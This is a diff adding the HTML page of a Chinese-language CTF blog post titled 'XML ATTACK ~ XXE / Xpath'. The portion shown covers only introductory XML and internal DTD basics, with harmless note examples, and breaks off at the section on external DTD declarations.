@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.0.0/css/all.min.css" integrity="sha256-jTIdiMuX/e3DGJUGwl3pKSxuc6YOuqtJYkM0bGQESA4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.10.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}}},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="一年前写的文章 重新加工一下 权当复习了 建议先好好看看 XML 用途 | 菜鸟教程 (runoob.com)  DTD 教程 | 菜鸟教程 (runoob.com)一切都要从基础开始学起">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XML ATTACK ~ XXE &#x2F; Xpath">
+<meta property="og:url" content="http://example.com/2022/08/17/xmlinjection/index.html">
+<meta property="og:site_name" content="b1ue0cean&#39;s   blog">
+<meta property="og:description" content="一年前写的文章 重新加工一下 权当复习了 建议先好好看看 XML 用途 | 菜鸟教程 (runoob.com)  DTD 教程 | 菜鸟教程 (runoob.com)一切都要从基础开始学起">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/08/17/xmlinjection/image-20220817151040061.png">
+<meta property="og:image" content="http://example.com/2022/08/17/xmlinjection/image-20220817151156740.png">
+<meta property="og:image" content="http://example.com/2022/08/17/xmlinjection/image-20220817160753861.png">
+<meta property="og:image" content="http://example.com/2022/08/17/xmlinjection/MyBlog/b1ue0cean.github.io/source_posts/xmlinjection/image-20220819024930877.png">
+<meta property="og:image" content="http://example.com/2022/08/17/xmlinjection/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYjF1ZTBjZWFuQFJPSVPvvIZyM3Dlrp7kuaA=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center.png">
+<meta property="og:image" content="http://example.com/2022/08/17/xmlinjection/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAYjF1ZTBjZWFuQFJPSVPvvIZyM3Dlrp7kuaA=,size_16,color_FFFFFF,t_70,g_se,x_16.png">
+<meta property="article:published_time" content="2022-08-17T05:56:03.000Z">
+<meta property="article:modified_time" content="2022-08-23T19:09:37.329Z">
+<meta property="article:author" content="b1ue0cean">
+<meta property="article:tag" content="xml">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/08/17/xmlinjection/image-20220817151040061.png">
+
+
+<link rel="canonical" href="http://example.com/2022/08/17/xmlinjection/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/08/17/xmlinjection/","path":"2022/08/17/xmlinjection/","title":"XML ATTACK ~ XXE / Xpath"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>XML ATTACK ~ XXE / Xpath | b1ue0cean's   blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="b1ue0cean's   blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">b1ue0cean's   blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome to my world -- sharing CTF & ML skills</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section">Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section">About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section">Tags<span class="badge">92</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">73</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">128</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XML%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">XML基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-XML"><span class="nav-number">1.1.</span> <span class="nav-text">什么是 XML</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-%E5%92%8C-HTML-%E4%B9%8B%E9%97%B4%E7%9A%84%E5%B7%AE%E5%BC%82"><span class="nav-number">1.2.</span> <span class="nav-text">XML 和 HTML 之间的差异</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-%E6%8A%8A%E6%95%B0%E6%8D%AE%E4%BB%8E-HTML-%E5%88%86%E7%A6%BB"><span class="nav-number">1.3.</span> <span class="nav-text">XML 把数据从 HTML 分离</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-%E6%A0%91%E7%BB%93%E6%9E%84"><span class="nav-number">1.4.</span> <span class="nav-text">XML 树结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-%E6%96%87%E6%A1%A3%E5%BD%A2%E6%88%90%E4%B8%80%E7%A7%8D%E6%A0%91%E7%BB%93%E6%9E%84"><span class="nav-number">1.5.</span> <span class="nav-text">XML 文档形成一种树结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="nav-number">1.6.</span> <span class="nav-text">一些要注意的地方</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%89%AF%E5%A5%BD%E7%9A%84XML%E6%96%87%E6%A1%A3"><span class="nav-number">1.7.</span> <span class="nav-text">良好的XML文档</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DTD"><span class="nav-number">2.</span> <span class="nav-text">DTD</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E9%83%A8%E7%9A%84-DOCTYPE-%E5%A3%B0%E6%98%8E"><span class="nav-number">2.1.</span> <span class="nav-text">内部的 DOCTYPE 声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%96%E9%83%A8%E6%96%87%E6%A1%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">2.2.</span> <span class="nav-text">外部文档声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8-DTD%EF%BC%9F"><span class="nav-number">2.3.</span> <span class="nav-text">为什么使用 DTD？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E4%BD%93"><span class="nav-number">3.</span> <span class="nav-text">实体</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%87%8D%E7%82%B9%E4%B8%80%EF%BC%9A"><span class="nav-number">3.1.</span> <span class="nav-text">重点一：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%87%8D%E7%82%B9%E4%BA%8C%EF%BC%9A"><span class="nav-number">3.2.</span> <span class="nav-text">重点二：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xpath%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">4.</span> <span class="nav-text">xpath基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-XPath"><span class="nav-number">4.1.</span> <span class="nav-text">什么是 XPath?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XPath-%E8%B7%AF%E5%BE%84%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-number">4.2.</span> <span class="nav-text">XPath 路径表达式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XPath-%E6%A0%87%E5%87%86%E5%87%BD%E6%95%B0"><span class="nav-number">4.3.</span> <span class="nav-text">XPath 标准函数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XPATH%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="nav-number">5.</span> <span class="nav-text">XPATH注入原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">6.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8A%E5%B9%B4%E5%81%9A%E7%9A%84"><span class="nav-number">6.1.</span> <span class="nav-text">今年做的</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98-xml-injection"><span class="nav-number">6.1.1.</span> <span class="nav-text">第一题 xml injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%A2%98-xpath-injection"><span class="nav-number">6.1.2.</span> <span class="nav-text">第二题 xpath injection</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NPUCTF2020-ezlogin"><span class="nav-number">6.2.</span> <span class="nav-text">[NPUCTF2020]ezlogin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%BB%E5%B9%B4%E5%81%9A%E7%9A%84"><span class="nav-number">6.3.</span> <span class="nav-text">去年做的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web373"><span class="nav-number">6.4.</span> <span class="nav-text">web373</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web374-%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6-Blind-OOB-XXE"><span class="nav-number">6.5.</span> <span class="nav-text">web374  (无回显读取本地敏感文件(Blind OOB XXE))</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BA%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80%E4%B8%ADxee%E7%9A%84%E5%8F%AF%E5%88%A9%E7%94%A8%E6%80%A7"><span class="nav-number">6.6.</span> <span class="nav-text">论各种语言中xee的可利用性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E5%90%88phar%E8%BF%9B%E8%A1%8Crce"><span class="nav-number">6.6.1.</span> <span class="nav-text">结合phar进行rce</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">6.7.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="b1ue0cean"
+      src="/uploads/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">b1ue0cean</p>
+  <div class="site-description" itemprop="description">我就是我，人间不一样的烟火</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">73</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">92</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/godrun666" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;godrun666" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1019076587@qq.com" title="E-Mail → mailto:1019076587@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/b1ue0cean7" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;b1ue0cean7" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_53755216" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_53755216" rel="noopener" target="_blank">CSDN</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/17/xmlinjection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+      <meta itemprop="name" content="b1ue0cean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="b1ue0cean's   blog">
+      <meta itemprop="description" content="我就是我，人间不一样的烟火">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="XML ATTACK ~ XXE / Xpath | b1ue0cean's   blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          XML ATTACK ~ XXE / Xpath
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-08-17 13:56:03" itemprop="dateCreated datePublished" datetime="2022-08-17T13:56:03+08:00">2022-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-24 03:09:37" itemprop="dateModified" datetime="2022-08-24T03:09:37+08:00">2022-08-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/xml/" itemprop="url" rel="index"><span itemprop="name">xml</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>一年前写的文章 重新加工一下 权当复习了</p>
+<p>建议先好好看看 <a target="_blank" rel="noopener" href="https://www.runoob.com/xml/xml-usage.html">XML 用途 | 菜鸟教程 (runoob.com)</a>  <a target="_blank" rel="noopener" href="https://www.runoob.com/dtd/dtd-tutorial.html">DTD 教程 | 菜鸟教程 (runoob.com)</a>一切都要从基础开始学起</p>
+<span id="more"></span>
+
+<h1 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h1><h2 id="什么是-XML"><a href="#什么是-XML" class="headerlink" title="什么是 XML"></a>什么是 XML</h2><ul>
+<li>XML 指可扩展标记语言（EXtensible Markup Language）。</li>
+<li>XML 是一种很像HTML的标记语言。</li>
+<li>XML 的设计宗旨是传输数据，而不是显示数据。</li>
+<li>XML 标签没有被预定义。您需要自行定义标签。</li>
+<li>XML 被设计为具有自我描述性。</li>
+<li>XML 是 W3C 的推荐标准。</li>
+</ul>
+<h2 id="XML-和-HTML-之间的差异"><a href="#XML-和-HTML-之间的差异" class="headerlink" title="XML 和 HTML 之间的差异"></a>XML 和 HTML 之间的差异</h2><p>XML 不是 HTML 的替代。</p>
+<p>XML 和 HTML 为不同的目的而设计：</p>
+<ul>
+<li>XML 被设计用来传输和存储数据，其焦点是数据的内容。</li>
+<li>HTML 被设计用来显示数据，其焦点是数据的外观。</li>
+</ul>
+<p>HTML 旨在显示信息，而 XML 旨在传输信息。</p>
+<h2 id="XML-把数据从-HTML-分离"><a href="#XML-把数据从-HTML-分离" class="headerlink" title="XML 把数据从 HTML 分离"></a>XML 把数据从 HTML 分离</h2><p>如果您需要在 HTML 文档中显示动态数据，那么每当数据改变时将花费大量的时间来编辑 HTML。</p>
+<p>通过 XML，数据能够存储在独立的 XML 文件中。这样您就可以专注于使用 HTML/CSS 进行显示和布局，并确保修改底层数据不再需要对 HTML 进行任何的改变。</p>
+<p>通过使用几行 JavaScript 代码，您就可以读取一个外部 XML 文件，并更新您的网页的数据内容。</p>
+<h2 id="XML-树结构"><a href="#XML-树结构" class="headerlink" title="XML 树结构"></a>XML 树结构</h2><p>XML 文档形成了一种树结构，它从”根部”开始，然后扩展到”枝叶”。</p>
+<hr>
+<h2 id="XML-文档形成一种树结构"><a href="#XML-文档形成一种树结构" class="headerlink" title="XML 文档形成一种树结构"></a>XML 文档形成一种树结构</h2><p>XML 文档必须包含<strong>根元素</strong>。该元素是所有其他元素的父元素。</p>
+<p>XML 文档中的元素形成了一棵文档树。这棵树从根部开始，并扩展到树的最底端。</p>
+<p>所有的元素都可以有子元素：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">child</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">subchild</span>&gt;</span>.....<span class="tag">&lt;/<span class="name">subchild</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>父、子以及同胞等术语用于描述元素之间的关系。父元素拥有子元素。相同层级上的子元素成为同胞（兄弟或姐妹）。</p>
+<p>所有的元素都可以有文本内容和属性（类似 HTML 中）。</p>
+<p><strong>一个很恰当的例子</strong></p>
+<p>您可以假设，从这个实例中，XML 文档包含了一张 Jani 写给 Tove 的便签。可以看出XML 具有出色的自我描述性</p>
+<ul>
+<li><p>第一行是 XML 声明。它定义 XML 的版本（1.0）和所使用的编码（UTF-8 : 万国码, 可显示各种语言）。</p>
+</li>
+<li><p>下一行描述文档的<strong>根元素</strong>（像在说：”本文档是一个便签”）<code>&lt;note&gt;</code></p>
+</li>
+<li><p>接下来 4 行描述根的 4 个<strong>子元素</strong>（to, from, heading 以及 body）</p>
+</li>
+<li><p>最后一行定义根元素的结尾 <code>&lt;/note&gt;</code></p>
+</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="一些要注意的地方"><a href="#一些要注意的地方" class="headerlink" title="一些要注意的地方"></a>一些要注意的地方</h2><blockquote>
+<p>所有的 XML 元素都必须有一个关闭标签</p>
+<p>XML 标签对大小写敏感。标签 <code>&lt;Letter&gt; </code>与标签<code>&lt;letter&gt;</code>是不同的</p>
+<p>XML 必须正确嵌套</p>
+<p>XML 属性值必须加引号</p>
+</blockquote>
+<p>加引号！</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">date</span>=<span class="string">&quot;12/11/2007&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="良好的XML文档"><a href="#良好的XML文档" class="headerlink" title="良好的XML文档"></a>良好的XML文档</h2><ul>
+<li>XML 文档必须有一个根元素</li>
+<li>XML元素都必须有一个关闭标签</li>
+<li>XML 标签对大小写敏感</li>
+<li>XML 元素必须被正确的嵌套</li>
+<li>XML 属性值必须加引号</li>
+</ul>
+<h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><p><a target="_blank" rel="noopener" href="https://www.runoob.com/dtd/dtd-tutorial.html">DTD 教程 | 菜鸟教程 (runoob.com)</a></p>
+<h2 id="内部的-DOCTYPE-声明"><a href="#内部的-DOCTYPE-声明" class="headerlink" title="内部的 DOCTYPE 声明"></a>内部的 DOCTYPE 声明</h2><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root-element</span> [element-declarations]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子</p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>以上 DTD 解释如下：</p>
+<ul>
+<li><p><strong>!DOCTYPE note</strong> (第二行)定义此文档是 <strong>note</strong> 类型的文档。</p>
+</li>
+<li><p><strong>!ELEMENT note</strong> (第三行)定义 <strong>note</strong> 元素有四个元素：”to、from、heading,、body”</p>
+</li>
+<li><p><strong>!ELEMENT to</strong> (第四行)定义 <strong>to</strong> 元素为 “#PCDATA” 类型</p>
+</li>
+<li><p><strong>!ELEMENT from</strong> (第五行)定义 <strong>from</strong> 元素为 “#PCDATA” 类型</p>
+</li>
+<li><p><strong>!ELEMENT heading</strong> (第六行)定义 <strong>heading</strong> 元素为 “#PCDATA” 类型</p>
+</li>
+<li><p><strong>!ELEMENT body</strong> (第七行)定义 <strong>body</strong> 元素为 “#PCDATA” 类型</p>
+</li>
+</ul>
+<h2 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a>外部文档声明</h2><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
